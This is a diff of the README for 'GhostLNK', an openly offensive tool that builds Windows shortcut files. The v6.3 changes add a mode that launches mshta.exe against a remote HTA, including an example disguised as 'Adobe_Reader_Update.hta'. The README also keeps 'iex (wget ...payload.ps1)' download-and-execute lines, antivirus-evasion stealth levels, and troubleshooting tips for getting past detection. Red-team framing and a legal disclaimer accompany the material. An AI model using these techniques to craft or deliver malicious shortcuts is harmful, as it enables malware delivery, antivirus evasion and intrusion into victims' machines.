@@ -8,19 +8,18 @@
 [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![GitHub](https://img.shields.io/badge/GitHub-Excalibra-purple?style=flat&logo=github)](https://github.com/Excalibra/)
 
-<img src="https://img.shields.io/badge/Version-6.2-6a1f7a?style=for-the-badge" alt="GhostLNK v6.2">
+<img src="https://img.shields.io/badge/Version-6.3-6a1f7a?style=for-the-badge" alt="GhostLNK v6.3">
 </p>
 
 <img width="1914" height="909" alt="image" src="https://github.com/user-attachments/assets/06232891-e5e5-45e0-9690-141953d10a3a" />
 
-
 ---
 
-## 📋 Overview
+## Overview
 
-**GhostLNK v6.2** is a professional-grade Windows LNK (Shortcut) file generator with advanced stealth capabilities and an intuitive step-by-step workflow. Designed for security researchers, penetration testers, and red team operations, it enables the creation of sophisticated LNK files that can bypass modern antivirus detection while maintaining realistic appearances.
+**GhostLNK v6.3** is a professional-grade Windows LNK (Shortcut) file generator with advanced stealth capabilities and an intuitive step-by-step workflow. Designed for security researchers, penetration testers, and red team operations, it enables the creation of sophisticated LNK files that can bypass modern antivirus detection while maintaining realistic appearances.
 
-### 🎯 Use Cases
+### Use Cases
 
 - Security Research & Malware Analysis
 - Red Team Operations & Penetration Testing
@@ -29,7 +28,7 @@
 
 ---
 
-## ✨ Key Features
+## Key Features
 
 ### 🚀 Advanced Payload Generation
 
@@ -38,8 +37,9 @@
 | **📁 Download & Open** | Downloads files to temp directory and opens them with default applications |
 | **⚡ Memory Execution** | Executes PowerShell scripts directly in memory - no files written to disk |
 | **🕵️ Ultra Stealth Mode** | Minimal output with obfuscated commands for maximum AV evasion |
+| **🎯 Raw Target Mode** | Bypass PowerShell entirely – run any executable (mshta.exe, cmd.exe, custom tools) with custom arguments |
 
-### 🛡️ Multi-Level Stealth System
+### Multi-Level Stealth System
 
 | Level | Name | Description | AV Evasion |
 |-------|------|-------------|------------|
@@ -47,7 +47,7 @@
 | 1 | Moderate | Uses aliases, avoids obvious patterns | ⚠️ Medium |
 | 2 | Maximum | Obfuscated code, no suspicious flags, AV bypass attempt | ✅ High |
 
-### 🎨 Professional GUI Features
+### Professional GUI Features
 
 - **Step-by-Step Workflow** - Clear 5-step process with visual progress indicators
 - **Smart Conflict Resolution** - Automatic option disabling with visual feedback
@@ -60,16 +60,17 @@
 - **Multi-Format Support** - Generate LNK files with customizable names and extensions
 - **Smart Import** - Automatically adds `-E` prefix to base64 strings when pasted manually
 
-### 🔧 Technical Capabilities
+### Technical Capabilities
 
 - **Base64 Encoding** - Automatic PowerShell command encoding
 - **Smart Payload Detection** - Auto-suggests payload type based on URL extension
 - **Recent History** - Saves recent URLs and conversions for quick access
 - **Cross-Format Export** - Copy commands, arguments, or generate complete LNK files
+- **Raw Target Execution** - Directly invoke any Windows executable with full argument control
 
 ---
 
-## 📦 Installation
+## Installation
 
 ### Prerequisites
 
@@ -105,7 +106,7 @@ GhostLNK automatically installs missing dependencies on first run:
 
 ---
 
-## 🎮 Usage Guide
+## Usage Guide
 
 ### Launching GhostLNK
 
@@ -117,7 +118,7 @@ python ghostlnk.py
 ./ghostlnk.py
 ```
 
-### Quick Start - 5 Step Workflow
+### Quick Start - 5 Step Workflow (PowerShell Mode)
 
 #### Step 1: Enter Your URL
 ```
@@ -157,7 +158,35 @@ Progress: ⚪ Step 1 → ⚪ Step 2 → ⚪ Step 3 → ⚪ Step 4
           (Turns green as you complete each step)
 ```
 
-### 🔄 Importing Existing Base64 Strings
+### Raw Target Mode (New in v6.3)
+
+Sometimes you don't want PowerShell at all. **Raw Target Mode** lets you generate LNK files that execute any program directly – perfect for `mshta.exe`, `rundll32.exe`, `cmd.exe`, or your own tools.
+
+#### How to Use Raw Target Mode
+
+1. **Enable Raw Target Mode** – Check the box in the right panel.
+2. **Set Target Path** – Full path to the executable (e.g., `C:\Windows\System32\mshta.exe`).
+3. **Set Arguments** – Any command-line arguments.  
+   *Note: URLs should be enclosed in quotes – optional but safe.*  
+   Example: `"https://example.com/script.hta"`
+4. **Working Directory (optional)** – e.g., `%TEMP%` or `C:\Users\Public`.
+5. **Choose Icon & Output Name** – Same as always.
+6. **Generate LNK** – The shortcut will run your raw target directly.
+
+#### Example: mshta.exe with Remote HTA
+
+```
+Target Path: C:\Windows\System32\mshta.exe
+Arguments:   "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/Adobe_Reader_Update.hta"
+```
+
+> 💡 **Why use Raw Target Mode?**  
+> - Avoid PowerShell detection entirely  
+> - Execute traditional binaries with custom flags  
+> - Run HTA, VBS, or any other script host  
+> - Perfect for living‑off‑the‑land (LOLBins) techniques
+
+### Importing Existing Base64 Strings
 
 If you have a pre-existing base64 encoded PowerShell command (from another tool), you can paste it directly into the **Import -E Argument** field and click **Import**. GhostLNK will automatically add the `-E` prefix if it's missing, ensuring the argument is ready for LNK generation.
 
@@ -171,7 +200,7 @@ A helpful hint appears below the import field to remind you to click Import afte
 
 ---
 
-## 🛡️ Stealth Mode Deep Dive
+## Stealth Mode Deep Dive
 
 ### Why Stealth Matters
 
@@ -207,7 +236,7 @@ iex (wget -useb "https://your-server.com/payload.ps1");
 
 ---
 
-## 📊 Payload Examples
+## Payload Examples
 
 ### Download & Open Mode (Stealth Level 2)
 ```powershell
@@ -227,9 +256,15 @@ iex (wget -useb "https://your-server.com/script.ps1");
 iex (wget -useb "https://your-server.com/payload.ps1");
 ```
 
+### Raw Target Mode (mshta.exe)
+```
+Target: C:\Windows\System32\mshta.exe
+Arguments: "https://example.com/update.hta"
+```
+
 ---
 
-## 🔧 Configuration
+## Configuration
 
 ### Settings File (`ghostlnk_config.json`)
 ```json
@@ -255,7 +290,7 @@ ICON_DATABASE = {
 
 ---
 
-## 🚀 Performance Metrics
+## Performance Metrics
 
 | Operation | Time |
 |-----------|------|
@@ -267,7 +302,7 @@ ICON_DATABASE = {
 
 ---
 
-## 📁 Project Structure
+## Project Structure
 
 ```
 GhostLNK/
@@ -280,7 +315,7 @@ GhostLNK/
 
 ---
 
-## 🎓 Educational Resources
+## Educational Resources
 
 ### Understanding LNK Attacks
 - [Microsoft LNK File Format Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
@@ -295,7 +330,7 @@ GhostLNK/
 
 ---
 
-## ⚠️ Legal & Ethical Use
+## Legal & Ethical Use
 
 **IMPORTANT:** GhostLNK is designed for:
 
@@ -313,7 +348,7 @@ GhostLNK/
 
 ---
 
-## 🤝 Contributing
+## Contributing
 
 We welcome contributions from the security community!
 
@@ -350,10 +385,11 @@ We welcome contributions from the security community!
 
 ---
 
-## 📝 Version History
+## Version History
 
 | Version | Date | Key Features |
 |---------|------|--------------|
+| 6.3 | 2026-04-05 | **Raw Target Mode** – Run any executable (mshta.exe, cmd.exe, etc.) with custom arguments, bypassing PowerShell entirely; helpful quoting note added |
 | 6.2 | 2026-04-01 | **Smart Import** – Automatic -E prefix addition for pasted base64 strings; GUI hint added; Conflict resolution fixes |
 | 6.1 | 2026-03-10 | Hidden PowerShell Window option added |
 | 6.0 | 2026-02-20 | Stealth Mode Edition with 3-level AV bypass |
@@ -365,19 +401,19 @@ We welcome contributions from the security community!
 
 ---
 
-## 🛠️ Troubleshooting
+## Troubleshooting
 
 ### Common Issues & Solutions
 
 **Q: LNK file doesn't execute properly**
 - Verify URL is accessible
 - Check Dropbox URLs have `dl=1`
-- Ensure target system has PowerShell
+- Ensure target system has PowerShell (or your raw target exists)
 
 **Q: Antivirus still detects the file**
 - Increase stealth level to 2
 - Use Memory Execute mode
-- Test with different icons
+- Try **Raw Target Mode** with a different executable
 
 **Q: GUI won't launch**
 - Install PyQt6: `pip install PyQt6`
@@ -395,17 +431,13 @@ We welcome contributions from the security community!
 **Q: Import field doesn't add `-E` automatically**
 - Click the **Import** button after pasting; the tool will add the prefix if missing.
 
----
-
-## 📞 Support & Contact
-
-- **GitHub Issues**: [Report bugs](https://github.com/Excalibra/GhostLNK/issues)
-- **Documentation**: [Wiki](https://github.com/Excalibra/GhostLNK/wiki)
-- **Discussions**: [Community Forum](https://github.com/Excalibra/GhostLNK/discussions)
+**Q: Raw Target Mode arguments not working with spaces?**
+- Enclose the whole argument in double quotes (as shown in the example note).  
+  *Note: The URL should be enclosed in quotes because it contains no spaces; quotes are optional but safe.*
 
 ---
 
-## 🙏 Acknowledgments
+## Acknowledgments
 
 - Thanks to the pylnk3 developers for the core LNK engine
 - Inspired by real-world APT techniques and red team tools
@@ -413,7 +445,7 @@ We welcome contributions from the security community!
 
 ---
 
-## 📄 License
+## License
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
@@ -426,24 +458,16 @@ Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files...
 ```
 
----
-
-## 🔗 Quick Links
-
-- [GitHub Repository](https://github.com/Excalibra/GhostLNK)
-- [Author Profile](https://github.com/Excalibra/)
-- [Report a Bug](https://github.com/Excalibra/GhostLNK/issues)
-- [Request a Feature](https://github.com/Excalibra/GhostLNK/issues)
 
 ---
 
 <p align="center">
-  <b>👻 GhostLNK v6.2 - Smart Execution Builder 👻</b><br>
+  <b>👻 GhostLNK v6.3 - Raw Target + Smart Execution Builder 👻</b><br>
   For authorized security testing and educational purposes only
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-6.2_Smart_Import-6a1f7a?style=flat-square">
+  <img src="https://img.shields.io/badge/Version-6.3_Raw_Target-6a1f7a?style=flat-square">
   <img src="https://img.shields.io/badge/Python-3.8+-blue?style=flat-square">
   <img src="https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square">
 </p>
